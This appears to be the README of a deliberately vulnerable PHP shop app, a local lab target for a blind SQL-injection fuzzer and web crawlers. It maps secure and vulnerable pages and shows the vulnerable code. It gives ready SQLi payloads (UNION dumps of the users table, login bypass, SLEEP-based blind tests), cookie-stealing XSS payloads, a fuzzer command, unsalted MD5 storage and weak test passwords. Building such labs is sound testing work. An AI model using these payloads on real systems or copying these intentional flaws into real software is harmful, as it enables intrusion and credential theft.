# Ryder's Puppy Fort Factory — vulnerability map

This app is **deliberately vulnerable** for local security testing. It is a
target for the blind SQL injection fuzzer and the crawlers in the parent repo,
and for manual SQLi/XSS practice. **Do not deploy it on a public or shared
network.**

The site has **30 pages**, **10 of which are rendered with JavaScript** (their
content and the links to them are built in the browser, so a basic HTML-only
spider cannot see them). See "JavaScript-rendered pages" below.

## Scope of "vulnerable" vs "secure"

Here "vulnerable" and "secure" refer specifically to **SQL injection (SQLi)**
and **cross-site scripting (XSS)**, the two classes this lab targets. A page
marked *secure* is free of SQLi and XSS; it is not a claim that it is hardened
against every possible attack.

One weakness is intentional and site-wide, outside that scope: **passwords are
stored as unsalted MD5**. That keeps the classic SQLi login bypass simple. It is
a real cryptographic weakness but is not itself an SQLi or XSS issue, so pages
that only do MD5 storage are still listed as *secure* for SQLi/XSS.

## Site structure

### Server-rendered pages (20) — discoverable by a basic spider

```
index.php          Home / featured products           (secure)
products.php       Product listing + category filter   (secure)
product.php        Product detail (?id=)               VULNERABLE  — SQLi (errors/UNION/time)
search.php         Product search (?q=)                VULNERABLE  — SQLi + reflected XSS
register.php       User registration                   (secure)
login.php          User login                          VULNERABLE  — SQLi / auth bypass
logout.php         Ends the session                    (secure)
add_to_cart.php    Add item to cart (POST)             (secure)
cart.php           View / remove cart items            (secure)
checkout.php       Order summary + place order         (secure)
profile.php        View own profile                    VULNERABLE  — stored XSS (bio)
edit_profile.php   Edit own profile                    (secure SQLi; input point for stored XSS)
contact.php        Contact form                        (secure)
about.php          About page                          (secure, static)
faq.php            FAQ page                            (secure, static)
blog.php           Blog index                          (secure)
blog_post.php      Blog post (?id=)                     VULNERABLE  — SQLi (blind: no errors)
newsletter.php     Newsletter signup (POST)            (secure)
careers.php        Careers page                        (secure, static)
track.php          Order tracking (?order_id=)         (secure)
```

### JavaScript-rendered pages (10) — invisible to a basic spider

```
deals.php            Deals               (secure)     fetch api/products.php
new-arrivals.php     New arrivals        (secure)     fetch api/products.php
bestsellers.php      Bestsellers         (secure)     fetch api/products.php
recommendations.php  Recommended         (secure)     fetch api/products.php
reviews.php          Reviews             VULNERABLE   DOM-based XSS (URL fragment #author=)
gallery.php          Photo gallery       (secure)     inline JSON data island
locations.php        Store locations     (secure)     inline JSON data island
support.php          Support centre      (secure)     inline JSON data island
wishlist.php         Wishlist            (secure)     localStorage + fetch
feedback.php         Feedback form       VULNERABLE   DOM-based XSS (query string ?ref=)
```

### Support files

```
api/products.php     JSON product feed for the fetch-based JS pages  (secure)
assets/js/site.js    Injects the "Discover" nav for the JS pages
assets/js/catalog.js Shared client-side product renderer
includes/, config/, assets/, sql/   templates, config, static assets, schema
```

## Summary table

| Page | Rendering | Parameter(s) | SQLi | XSS | Notes |
| --- | --- | --- | :---: | :---: | --- |
| `index.php` | server | none | No | No | No user input in the query |
| `products.php` | server | `category` (GET) | No | No | Prepared statement + escaped output |
| `product.php` | server | `id` (GET) | **Yes** | No | `id` concatenated raw; verbose errors |
| `search.php` | server | `q` (GET) | **Yes** | **Yes (reflected)** | `q` in a raw `LIKE` and echoed unescaped |
| `register.php` | server | `username`,`email`,… (POST) | No | No | Prepared statements + escaped output |
| `login.php` | server | `username`,`password` (POST) | **Yes** | No | `username` concatenated raw; auth bypass |
| `logout.php` | server | none | No | No | Session teardown only |
| `add_to_cart.php` | server | `product_id`,`quantity` (POST) | No | No | Integer casts + prepared upsert |
| `cart.php` | server | `remove` (POST) | No | No | Prepared statements scoped to user |
| `checkout.php` | server | `place_order` (POST) | No | No | Prepared statements |
| `profile.php` | server | reads stored `bio` | No | **Yes (stored)** | `bio` rendered unescaped |
| `edit_profile.php` | server | `full_name`,`email`,`address`,`bio` (POST) | No | No* | Prepared update; *stores raw `bio` (stored-XSS source) |
| `contact.php` | server | `name`,`message` (POST) | No | No | Reflected through `htmlspecialchars` |
| `about.php` | server | none | No | No | Static content |
| `faq.php` | server | none | No | No | Static content |
| `blog.php` | server | none | No | No | Listing; no user input |
| `blog_post.php` | server | `id` (GET) | **Yes** | No | `id` concatenated raw; **no errors** (blind) |
| `newsletter.php` | server | `email` (POST) | No | No | Escaped echo; no DB write |
| `careers.php` | server | none | No | No | Static content |
| `track.php` | server | `order_id` (GET) | No | No | Integer-cast; canned status |
| `deals.php` | **JS** | none | No | No | Fetches `api/products.php`; escaped in JS |
| `new-arrivals.php` | **JS** | none | No | No | Fetches `api/products.php`; escaped in JS |
| `bestsellers.php` | **JS** | none | No | No | Fetches `api/products.php`; escaped in JS |
| `recommendations.php` | **JS** | none | No | No | Fetches `api/products.php`; escaped in JS |
| `reviews.php` | **JS** | `#author=` (fragment) | No | **Yes (DOM)** | Fragment written via `innerHTML` |
| `gallery.php` | **JS** | none | No | No | Inline JSON island; `textContent` |
| `locations.php` | **JS** | none | No | No | Inline JSON island; `textContent` |
| `support.php` | **JS** | none | No | No | Inline JSON island; `textContent` |
| `wishlist.php` | **JS** | none | No | No | localStorage + `api/products.php` |
| `feedback.php` | **JS** | `?ref=` (query) | No | **Yes (DOM)** | Query param written via `innerHTML` |
| `api/products.php` | server (JSON) | `category` (GET) | No | n/a | Prepared statement; returns JSON |

## Vulnerable pages in detail

### 1. `product.php` — SQL injection (`id`)

```php
$id = $_GET['id'] ?? '1';
$sql = "SELECT id, name, description, price, category, stock FROM products WHERE id = $id";
```

- Boolean: `product.php?id=1 OR 1=1`
- UNION: `product.php?id=0 UNION SELECT username,password,email,1,2,3 FROM users`
- Time-based: `product.php?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)`

Primary target for the time-based fuzzer:

```bash
python ../blind_sqli_fuzzer.py --url http://localhost/product.php --param id --authorized
```

`mysqli_query` runs one statement, so stacked queries (`; WAITFOR ...`) do not
apply; SLEEP-, boolean-, and UNION-based injection do.

### 2. `search.php` — SQL injection + reflected XSS (`q`)

- SQLi: `search.php?q=x%' UNION SELECT username,password,email,1 FROM users -- -`
- SQLi (time): `search.php?q=x%' AND (SELECT 1 FROM (SELECT(SLEEP(5)))y) -- -`
- Reflected XSS: `search.php?q=<script>alert(document.cookie)</script>`
- Attribute break-out: `search.php?q="><script>alert(1)</script>`

### 3. `login.php` — SQL injection / auth bypass (`username`)

```php
$sql = "SELECT id, username FROM users WHERE username = '$username' AND password = '" . md5($password) . "'";
```

- Bypass: username = `admin' -- -` or `' OR '1'='1' -- -`
- Time-based: username = `admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -`

### 4. `profile.php` — stored XSS (`bio`)

`profile.php` renders the stored `bio` without escaping; the value is entered on
`edit_profile.php` (prepared statement, so not SQLi).

1. Log in, open `edit_profile.php`.
2. Set the bio to `<img src=x onerror=alert('stored-xss')>` and save.
3. Load `profile.php` — the payload runs for anyone viewing that profile.

### 5. `blog_post.php` — blind SQL injection (`id`)

```php
$id = $_GET['id'] ?? '1';
$sql = "SELECT id, title, author, body, published_at FROM posts WHERE id = $id";
$res = @mysqli_query($conn, $sql);   // errors are NOT surfaced
```

Unlike `product.php`, this page prints no DB errors and shows the same
"post not found" for any empty result, so it is a good **boolean/time-based
blind** target:

- `blog_post.php?id=1 AND 1=1` → post renders (true)
- `blog_post.php?id=1 AND 1=2` → "not found" (false)
- `blog_post.php?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))x)` → delay (time-based)

Requires the `posts` table (see "Database setup" below).

### 6. `reviews.php` — DOM-based XSS (URL fragment)

```js
var m = location.hash.match(/author=([^&]*)/);
document.getElementById('greeting').innerHTML =
    '<p class="notice ok">Thanks for your review, ' + decodeURIComponent(m[1]) + '!</p>';
```

Payload: `reviews.php#author=<img src=x onerror=alert(document.cookie)>`

The payload lives in the fragment (`#...`), so it never reaches the server. A
server-side scanner and the raw HTML both miss it.

### 7. `feedback.php` — DOM-based XSS (query string)

```js
var ref = new URLSearchParams(location.search).get('ref');
document.getElementById('fb-status').innerHTML = 'Thanks for visiting from ' + ref + '!';
```

Payload: `feedback.php?ref=<img src=x onerror=alert(document.domain)>`

The `ref` parameter is in the query string but is only ever used client-side, so
the server response contains no reflection — a server-side scanner sees nothing,
and only a JS-executing client triggers it.

## JavaScript-rendered pages (crawler visibility)

Ten pages build their content in the browser, and the "Discover" nav links that
reach them are injected by `assets/js/site.js` at runtime. None of this appears
in the static HTML:

- The fetch-based pages (`deals`, `new-arrivals`, `bestsellers`,
  `recommendations`, `wishlist`) request `api/products.php` and build the product
  cards and their `product.php?id=` links in JavaScript. The raw HTML is an empty
  shell.
- The data-island pages (`reviews`, `gallery`, `locations`, `support`) render
  from an inline `<script type="application/json">` block. A basic spider does
  not treat script contents as page content or as links.
- The Discover links exist only in `site.js`, so `deals.php`, `reviews.php`, and
  the rest are never present as `<a href>` tags in the served markup.

A basic spider that parses only static HTML (like `tools/spider.py`, which uses
BeautifulSoup, follows `<a href>` links, and strips URL fragments) will not
discover any of these 10 pages, will not extract the JS-built `product.php`
links, and never sees the two DOM-XSS vectors. A headless, JavaScript-executing
browser is required to reach and test them. The 20 server-rendered pages, by
contrast, are linked from the header and footer and are fully crawlable.

## Secure pages (expected true negatives)

All pages except the seven above are free of SQLi and XSS: `index.php`,
`products.php`, `register.php`, `add_to_cart.php`, `cart.php`, `checkout.php`,
`edit_profile.php`, `contact.php`, `about.php`, `faq.php`, `blog.php`,
`newsletter.php`, `careers.php`, `track.php`, `deals.php`, `new-arrivals.php`,
`bestsellers.php`, `recommendations.php`, `gallery.php`, `locations.php`,
`support.php`, `wishlist.php`, and `api/products.php`. They use prepared
statements and/or integer casts for all database access and escape all output.
Point your scanner at these to confirm it does not raise false positives.

## Database setup

The blog pages need a `posts` table.

- **Fresh install:** `sql/schema.sql` creates and seeds everything, including
  `posts`.
- **Existing database (keep your data):** run the additive migration
  `sudo mysql puppy_fort < sql/002_blog.sql`.

## Test accounts

| Username | Password | Role |
| --- | --- | --- |
| `admin` | `admin123` | seeded admin-ish user |
| `alice` | `password1` | regular user |
| `bob` | `letmein` | regular user |

New accounts can also be created through `register.php`.
